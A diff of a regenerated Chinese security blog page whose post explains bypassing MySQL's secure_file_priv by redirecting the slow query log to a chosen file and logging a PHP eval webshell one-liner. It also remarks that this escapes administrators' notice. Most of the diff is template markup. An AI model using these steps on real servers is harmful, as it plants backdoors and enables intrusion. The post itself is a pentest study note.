@@ -6,10 +6,10 @@
 
 
 <html class="theme-next mist use-motion" lang="zh-Hans">
-<head><meta name="generator" content="Hexo 3.9.0">
-  <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
 <meta name="theme-color" content="#222">
 
 
@@ -20,8 +20,8 @@
 
 
 
-<meta http-equiv="Cache-Control" content="no-transform">
-<meta http-equiv="Cache-Control" content="no-siteapp">
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
 
 
 
@@ -40,7 +40,7 @@
 
   
   
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
 
 
 
@@ -48,9 +48,9 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
 
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="渗透测试,">
+  <meta name="keywords" content="渗透测试," />
 
 
 
@@ -79,28 +79,28 @@
 
 
 
-<meta name="description" content="渗透学习记录本文参考自https://www.cnblogs.com/c1e4r/articles/8902444.html">
-<meta name="keywords" content="渗透测试">
+<meta name="description" content="渗透学习记录本文参考自https:&#x2F;&#x2F;www.cnblogs.com&#x2F;c1e4r&#x2F;articles&#x2F;8902444.html">
 <meta property="og:type" content="article">
 <meta property="og:title" content="mysql突破secure_file_priv写shell">
-<meta property="og:url" content="http://yoursite.com/2019/09/28/mysql突破secure-file-priv写shell/index.html">
+<meta property="og:url" content="https://lockcy.github.io/2019/09/28/mysql%E7%AA%81%E7%A0%B4secure-file-priv%E5%86%99shell/index.html">
 <meta property="og:site_name" content="lockcy&#39;s cave">
-<meta property="og:description" content="渗透学习记录本文参考自https://www.cnblogs.com/c1e4r/articles/8902444.html">
-<meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2019/09/28/mysql突破secure-file-priv写shell/1.png">
-<meta property="og:image" content="http://yoursite.com/2019/09/28/mysql突破secure-file-priv写shell/2.png">
-<meta property="og:updated_time" content="2019-09-28T11:41:06.826Z">
+<meta property="og:description" content="渗透学习记录本文参考自https:&#x2F;&#x2F;www.cnblogs.com&#x2F;c1e4r&#x2F;articles&#x2F;8902444.html">
+<meta property="og:locale">
+<meta property="og:image" content="https://lockcy.github.io/2019/09/28/mysql%E7%AA%81%E7%A0%B4secure-file-priv%E5%86%99shell/1.png">
+<meta property="og:image" content="https://lockcy.github.io/2019/09/28/mysql%E7%AA%81%E7%A0%B4secure-file-priv%E5%86%99shell/2.png">
+<meta property="article:published_time" content="2019-09-28T11:22:44.000Z">
+<meta property="article:modified_time" content="2019-09-28T11:41:06.826Z">
+<meta property="article:author" content="lockcy">
+<meta property="article:tag" content="渗透测试">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="mysql突破secure_file_priv写shell">
-<meta name="twitter:description" content="渗透学习记录本文参考自https://www.cnblogs.com/c1e4r/articles/8902444.html">
-<meta name="twitter:image" content="http://yoursite.com/2019/09/28/mysql突破secure-file-priv写shell/1.png">
+<meta name="twitter:image" content="https://lockcy.github.io/2019/09/28/mysql%E7%AA%81%E7%A0%B4secure-file-priv%E5%86%99shell/1.png">
 
 
 
 <script type="text/javascript" id="hexo.configurations">
   var NexT = window.NexT || {};
   var CONFIG = {
-    root: '/',
+    root: '',
     scheme: 'Mist',
     version: '5.1.4',
     sidebar: {"position":"left","display":"always","offset":12,"b2t":true,"scrollpercent":true,"onmobile":false},
@@ -123,7 +123,7 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/09/28/mysql突破secure-file-priv写shell/">
+  <link rel="canonical" href="https://lockcy.github.io/2019/09/28/mysql突破secure-file-priv写shell/"/>
 
 
 
@@ -139,7 +139,7 @@
 
 
 
-</head>
+<meta name="generator" content="Hexo 5.4.0"></head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
@@ -157,7 +157,7 @@
     
 
     <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
+      <a href="/"  class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
         <span class="site-title">lockcy's cave</span>
         <span class="logo-line-after"><i></i></span>
@@ -187,7 +187,7 @@
         <li class="menu-item menu-item-home">
           <a href="/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
             
             首页
           </a>
@@ -197,7 +197,7 @@
         <li class="menu-item menu-item-about">
           <a href="/about/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
             
             关于
           </a>
@@ -207,7 +207,7 @@
         <li class="menu-item menu-item-tags">
           <a href="/tags/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
             
             标签
           </a>
@@ -217,7 +217,7 @@
         <li class="menu-item menu-item-archives">
           <a href="/archives/" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
             
             归档
           </a>
@@ -256,11 +256,11 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/28/mysql突破secure-file-priv写shell/">
+    <link itemprop="mainEntityOfPage" href="https://lockcy.github.io/2019/09/28/mysql%E7%AA%81%E7%A0%B4secure-file-priv%E5%86%99shell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="lockcy">
-      <meta itemprop="description" content>
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
       <meta itemprop="image" content="/images/harutya.jpg">
     </span>
 
@@ -317,7 +317,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  517
+                  518
                 </span>
               
 
@@ -354,29 +354,26 @@
       
 
       
-        <p>渗透学习记录<br>本文参考自<a href="https://www.cnblogs.com/c1e4r/articles/8902444.html" target="_blank" rel="noopener">https://www.cnblogs.com/c1e4r/articles/8902444.html</a></p>
-<a id="more"></a>
+        <p>渗透学习记录<br>本文参考自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/c1e4r/articles/8902444.html">https://www.cnblogs.com/c1e4r/articles/8902444.html</a></p>
+<span id="more"></span>
 
 <p>secure_file_priv 为 NULL 时，表示限制mysqld不允许导入或导出。<br>secure_file_priv 为 /tmp 时，表示限制mysqld只能在/tmp目录中执行导入导出，其他目录不能执行。<br>secure_file_priv 没有值时，表示不限制mysqld在任意目录的导入导出。<br>在mysql 5.6.34版本以后 secure_file_priv的值默认为NULL，直接select into outfile会失败</p>
-<img src="/2019/09/28/mysql突破secure-file-priv写shell/1.png">
+<img src="/2019/09/28/mysql%E7%AA%81%E7%A0%B4secure-file-priv%E5%86%99shell/1.png" class="">
 
 <p>只能够通过以下方式修改<br>windows下:<br>修改mysql.ini 文件，在[mysqld] 下添加条目: secure_file_priv =<br>保存，重启mysql。</p>
 <p>Linux下:<br>在/etc/my.cnf的[mysqld]下面添加local-infile=0选项。</p>
 <p>mysql也具有日志，我们也可以通过日志来getshell。<br>mysql日志主要包含:错误日志、查询日志、慢查询日志、事务日志</p>
 <p>我们主要利用慢查询日志来写shell,步骤大致分为三步:</p>
 <p>1.设置slow_query_log=1.即启用慢查询日志(默认禁用)。<br>show variables like ‘%slow_query_log%’;</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global slow_query_log=1;</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global slow_query_log&#x3D;1;</span><br></pre></td></tr></table></figure>
 <p>2.伪造(修改)slow_query_log_file日志文件的绝对路径以及文件名<br>set global slow_query_log_file=’dir\filename’</p>
 <p>3.向日志文件写入shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &apos;&lt;?php eval($_POST[cmd]);?&gt;&apos; or sleep(13);</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php eval($_POST[cmd]);?&gt;&#39; or sleep(13);</span><br></pre></td></tr></table></figure>
 <p>执行成功</p>
-<img src="/2019/09/28/mysql突破secure-file-priv写shell/2.png">
+<img src="/2019/09/28/mysql%E7%AA%81%E7%A0%B4secure-file-priv%E5%86%99shell/2.png" class="">
 
 <p>对慢查询日志的补充:<br>因为是用的慢查询日志，所以说只有当查询语句执行的时间要超过系统默认的时间时,该语句才会被记入进慢查询日志。<br>时间默认超过多少的称为慢查询日志？<br>一般都是通过long_query_time选项来设置这个时间值，时间以秒为单位，可以精确到微秒。如果查询时间超过了这个时间值（默认为10秒），这个查询语句将被记录到慢查询日志中。查看服务器默认时间值方式如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &apos;%long_query_time%&apos;</span><br></pre></td></tr></table></figure>
-
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#39;%long_query_time%&#39;</span><br></pre></td></tr></table></figure>
 <p>通常情况下执行sql语句时的执行时间一般不会超过10s，所以说这个日志文件应该是比较小的，而且默认也是禁用状态，不会引起管理员的察觉。</p>
 
       
@@ -401,7 +398,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/渗透测试/" rel="tag"># 渗透测试</a>
+            <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
           
         </div>
       
@@ -414,7 +411,7 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/09/26/一次安卓后端审计/" rel="next" title="一次安卓后端审计">
+              <a href="/2019/09/26/%E4%B8%80%E6%AC%A1%E5%AE%89%E5%8D%93%E5%90%8E%E7%AB%AF%E5%AE%A1%E8%AE%A1/" rel="next" title="一次安卓后端审计">
                 <i class="fa fa-chevron-left"></i> 一次安卓后端审计
               </a>
             
@@ -424,7 +421,7 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/10/01/关于mysql读取文件的几种利用方式/" rel="prev" title="关于mysql几种读取文件及利用的方式">
+              <a href="/2019/10/01/%E5%85%B3%E4%BA%8Emysql%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/" rel="prev" title="关于mysql几种读取文件及利用的方式">
                 关于mysql几种读取文件及利用的方式 <i class="fa fa-chevron-right"></i>
               </a>
             
@@ -474,9 +471,12 @@
   <aside id="sidebar" class="sidebar">
     
     <div class="sidebar-inner">
-		<div id="music163player">
-			<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="450" src="//music.163.com/outchain/player?type=0&id=2196816455&auto=1&height=430"></iframe>
-		</div>
+
+
+		<!--<div id="music163player">
+			<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=450 src="//music.163.com/outchain/player?type=0&id=2196816455&auto=1&height=430"></iframe>
+		</div>-->
+
       
 
       
@@ -485,10 +485,12 @@
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
-              <img class="site-author-image" itemprop="image" src="/images/harutya.jpg" alt="lockcy">
+              <img class="site-author-image" itemprop="image"
+                src="/images/harutya.jpg"
+                alt="" />
             
-              <p class="site-author-name" itemprop="name">lockcy</p>
-              <p class="site-description motion-element" itemprop="description">A mind at peace with all below, a heart whose love is innocent!</p>
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
           </div>
 
           <nav class="site-state motion-element">
@@ -496,9 +498,9 @@
             
               <div class="site-state-item site-state-posts">
               
-                <a href="/archives/">
+                <a href="/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-count">43</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -539,12 +541,18 @@
             </div>
           
 
+          <link rel="stylesheet" href="/dist/APlayer.min.css">
+          <div id="aplayer"></div>
+          <script type="text/javascript" src="/dist/APlayer.min.js"></script>
+          <script type="text/javascript" src="/dist/music.js"></script>
+      
           
           
 
 
           
           
+
 
           
 
@@ -586,7 +594,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">33.8k</span>
+    <span title="Site words total count">35.6k</span>
   
 </div>
 
@@ -607,7 +615,7 @@
 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
 <span class="post-meta-divider">|</span>
-<span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv" < span>人</span>
+<span id="busuanzi_container_site_uv">本站访客数<span id="busuanzi_value_site_uv"</span>人</span>
 
 
 
@@ -620,7 +628,7 @@
 
 
         
-      </span></div>
+      </div>
     </footer>
 
     
@@ -775,5 +783,6 @@
 
   
 
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</body>
 </html>
+<script src="/live2d-widget/autoload.js"></script>
